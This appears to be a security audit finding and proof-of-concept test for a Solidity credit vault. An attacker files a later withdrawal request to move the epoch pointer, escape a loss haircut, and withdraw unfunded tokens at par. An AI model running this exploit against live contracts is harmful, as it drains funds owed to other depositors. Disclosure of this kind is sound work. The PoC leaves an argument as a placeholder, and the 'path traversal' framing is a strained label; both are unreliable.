### Title
Re-requesting a withdrawal in a later epoch lets a lender escape a loss-adjusted haircut and claim the full receipt at par - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
The path-traversal bug class (attacker-controlled identifier escapes its intended boundary) maps to `IdleCreditVault._claimLossAdjustedWithdrawRequest`, where the claim "path" is keyed solely by the mutable pointer `lastWithdrawRequest[_user]`. When a loss-adjusted epoch occurs, the haircut is only recoverable through `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]`; by simply submitting a second `requestWithdraw` in a later epoch, the attacker moves the pointer forward so the loss lookup returns 0, and the still-recorded epoch-N basis inside the aggregate `withdrawsRequests[_user]` is paid out at full par by `_claimFundedWithdrawRequest` — funds the borrower never transferred.

### Finding Description
- On a partial funding at `stopEpochWithDuration`, `collectWithdrawFunds` sets `pendingWithdraws = 0`, stores `lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice`, and transfers only the reduced `_amount` from the CDO. The user's full pre-haircut basis remains recorded in `withdrawsRequests[_user]` / `withdrawsRequestsByEpoch[_user][lossEpoch]` — by design, since the claim path is supposed to apply `lossRecoveryPrice`. [1](#0-0) 
- The loss-adjusted claim looks up `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]`. `lastWithdrawRequest` is attacker-influenced: `requestWithdraw` overwrites it with `currentEpoch` on every call, and there is no guard preventing a new request while a haircutted receipt is pending — the code comments explicitly state a user "can request another withdraw" and simply wait another epoch. [2](#0-1) 
- After the attacker re-requests in epoch M > N, `lastWithdrawRequest[_user] = M`, so `lossRecoveryPriceByEpoch[M] == 0` and `_claimLossAdjustedWithdrawRequest` returns 0 without clearing the epoch-N entries. `_clearWithdrawClaimForEpoch` is never invoked for epoch N, so `withdrawsRequestsByEpoch[_user][N]` and its contribution to `withdrawsRequests[_user]` survive. [3](#0-2) 
- `_claimFundedWithdrawRequest` then pays `withdrawsRequests[_user]` — which still includes the full epoch-N basis — at par via `_transferFundedClaim`, even though the strategy only received `basis * lossRecoveryPrice / RECOVERY_FULL` for that receipt. [4](#0-3) 

### Impact Explanation
Direct theft / insolvency: the attacker redeems `claimBasis` instead of `claimBasis * lossRecoveryPrice / RECOVERY_FULL`, extracting `claimBasis * (1 - lossRecoveryPrice/RECOVERY_FULL)` of unfunded underlying from the strategy's funded-claim reserve. That reserve is shared by all holders of funded receipts, so other users' claims revert on insufficient balance or the vault pays out more than it holds — a broken "one receipt, haircut-adjusted payout" invariant and a socialized-loss bypass.

### Likelihood Explanation
Requires a `stopEpochWithDuration` partial funding (honest manager/borrower action during a loss event) while the attacker holds a pending receipt — the exact scenario this code path exists for. The attacker then only needs one extra `requestWithdraw` (any small tranche amount) in a subsequent epoch and waits for that epoch to end before calling `claimWithdrawRequest`. No privileged role, no race, no oracle dependence.

### Recommendation
In `_claimLossAdjustedWithdrawRequest`, iterate/clear the loss basis independent of `lastWithdrawRequest` — e.g., check `lossRecoveryPriceByEpoch` for every epoch present in `withdrawsRequestsByEpoch[_user]` rather than only the latest marker. Alternatively, in `requestWithdraw`, first settle any prior loss-adjusted receipt (apply the haircut and move the residue to a paid/funded bucket) before overwriting `lastWithdrawRequest[_user]`.

```solidity
pragma solidity 0.8.10;

import "./TestIdleCDOBase.sol"; // existing fork harness

contract LossHaircutEscape is TestIdleCDOBase {
    // Assumes standard fixture: idleCDO/cdoEpoch/strategy/AAtranche funded,
    // borrower honest, manager calls stopEpochWithDuration with a partial fund.
    function testEscapeLossHaircut() external {
        uint256 deposit = 100_000 * ONE_SCALE;
        uint256 minted  = idleCDO.depositAA(deposit);   // attacker deposits

        _startEpochAndCheckPrices(0);

        // attacker requests withdraw during epoch 0 (epoch N)
        uint256 basis = cdoEpoch.requestWithdraw(minted, address(AAtranche));

        // honest manager stops epoch with a realized loss; borrower funds only
        // pendingToFund < basis -> lossRecoveryPriceByEpoch[N] = p < RECOVERY_FULL,
        // collectWithdrawFunds pulls only the haircutted amount
        vm.warp(cdoEpoch.epochEndDate() + 1);
        vm.prank(manager);
        cdoEpoch.stopEpochWithDuration(/* _lossAmount covering ~50% of pending basis */, /*duration*/ 30 days);

        // attacker re-requests a dust withdraw in the next epoch, moving
        // lastWithdrawRequest[attacker] to epoch M > N
        _startEpochAndCheckPrices(1);
        cdoEpoch.requestWithdraw(1, address(AAtranche)); // dust receipt

        // epoch M ends normally, fully funded
        vm.warp(cdoEpoch.epochEndDate() + 1);
        vm.prank(manager);
        cdoEpoch.stopEpoch(0, 0);

        // claim: _claimLossAdjustedWithdrawRequest looks up epoch M (price 0,
        // returns early), then _claimFundedWithdrawRequest pays the FULL
        // epoch-N basis at par plus the dust receipt
        uint256 balBefore = underlying.balanceOf(address(this));
        cdoEpoch.claimWithdrawRequest();
        uint256 claimed = underlying.balanceOf(address(this)) - balBefore;

        uint256 haircut = IdleCreditVault(address(strategy))
            .lossRecoveryPriceByEpoch(0);
        // BUG: claimed == basis + dust instead of basis * haircut / 1e18 + dust
        assertGt(claimed, basis * haircut / 1e18 + 1);
        assertApproxEqAbs(claimed, basis + 1, 2);
    }
}
```

```text
  function _claimFundedWithdrawRequest(address _user) internal returns (uint256 amount) {
    // User should wait at least an epoch before claiming the withdraw. Once the epoch is over user can withdraw 
    // at any time even if a new epoch started. 
    // So if epochNumber is the same as the last withdraw request then we revert. Epoch number is increased at stopEpoch
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);
```

```text
  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
    }
    if (_amount != 0) {
      underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
    }
```

```text
  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
  }
```

```text
  function _clearWithdrawClaimForEpoch(address _user, uint256 _claimEpoch, bool _isClearingApr0) internal returns (uint256 claimBasis, uint256 burnAmount) {
    (claimBasis, burnAmount) = _withdrawClaimAmountsForEpoch(_user, _claimEpoch);
    if (claimBasis == 0) return (claimBasis, burnAmount);

    uint256 normalAmount = withdrawsRequestsByEpoch[_user][_claimEpoch];
    if (normalAmount != 0) {
      withdrawsRequestsByEpoch[_user][_claimEpoch] = 0;
      // The aggregate may also include older funded receipts; clear only this epoch's piece.
      withdrawsRequests[_user] -= normalAmount;
    }
    Apr0UserData storage apr0User = apr0Users[_user];
    if (apr0User.principal != 0 && apr0User.principalEpoch == _claimEpoch) {
      if (_isClearingApr0) {
        uint256 apr0Principal = apr0User.principal;
        uint256 totalApr0Principal = apr0TotalPrincipal;
        // prepareStopEpochWithApr0 may already close the global APR0 bucket before default finalization.
        apr0TotalPrincipal = apr0Principal >= totalApr0Principal ? 0 : totalApr0Principal - apr0Principal;
      }
      apr0User.principal = 0;
      apr0User.principalEpoch = 0;
    }
    if (lastWithdrawRequest[_user] == _claimEpoch) {
      // The cleared epoch was the latest request marker. Any remaining normal/APR0 receipt
      // is older and already funded, so it can continue to the funded-claim path.
      lastWithdrawRequest[_user] = 0;
    }
```
